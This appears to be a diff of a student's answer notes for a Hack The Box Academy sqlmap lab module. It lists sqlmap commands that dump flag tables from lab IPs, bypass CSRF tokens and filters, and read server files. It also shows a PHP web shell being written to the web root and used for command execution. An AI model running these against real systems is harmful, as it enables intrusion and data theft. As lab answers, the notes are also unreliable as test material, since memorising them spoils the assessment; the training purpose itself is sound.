@@ -151,7 +151,7 @@ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"	Reading a loc
 sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"	Writing a file
 sqlmap -u "http://www.example.com/?id=1" --os-shell	Spawning an OS shell
 
-ANSWERS SQLMap ESSENTIALS
+# ANSWERS SQLMap ESSENTIALS
 What's the contents of table flag2? (Case #2) = Detect and exploit SQLi vulnerability in POST parameter id
 sqlmap -u http://167.71.128.18:30210/case2.php? --data 'id=1' --batch --dump
 What's the contents of table flag3? (Case #3) = Detect and exploit SQLi vulnerability in Cookie value id=1
@@ -175,16 +175,23 @@ get token name and value via browser > network > requests.
 sqlmap -u "http://178.128.163.230:31018/case8.php" --data="id=1&t0ken=Af1394DLz9Q2HfMDehREVTpjL6jlULjqLCrM2UO4vY" --csrf-token="t0ken" --batch --dump
 What's the contents of table flag9? (Case #9)
 sqlmap -u "http://178.128.163.230:31018/case9.php?id=1&uid=29125" --randomize=uid --batch --dump -v 5 | grep HTB
+What's the contents of table flag10? (Case #10)
+sqlmap -u 'http://165.22.113.109:32331/case10.php' --data="id=1" --random-agent --batch --dump
+What's the contents of table flag11? (Case #11)
+sqlmap -u 'http://165.22.113.109:32331/case11.php?id=1' --tamper=between --batch --dump  
 
-http://178.128.163.230:31018/case10.php
-sqlmap -u "http://178.128.163.230:31018/case10.php" --passwords --batch --dump
-https://forum.hackthebox.com/t/academy-sqlmap-essentials-case-10/4310  -D -schema -tor
-http://178.128.163.230:31018/case9.php?id=1&uid=810305537
-7F4DA0C0j5OW2hdOZ2ec65wGMFj0Qp0ub3pfpU0ZwQ
+Try to use SQLMap to read the file "/var/www/html/flag.txt
+sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.txt"  
+Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
+   sqlmap -u "http://134.209.176.83:31022/?id=1" --is-dba 
+   35  sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.txt" (files is then located in output dir listed) 
+   43  echo '<?php system($_GET["cmd"]); ?>' > shell.php
+   45  sqlmap -u "http://134.209.176.83:31022/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+   46  curl http://134.209.176.83:31022/shell.php?cmd=ls+-la
+   47  sqlmap -u "http://134.209.176.83:31022/?id=1" --os-shell
+   in browser DO http://134.209.176.83:31022/shell.php?cmd=cat+/flag.txt
 
 
-What's the contents of table flag9? (Case #9)
-sqlmap -u "http://159.65.49.148:30071/case8.php?id=1&rp=3216980817" --randomize=rp --batch -v 5 | grep URI
 
 
 
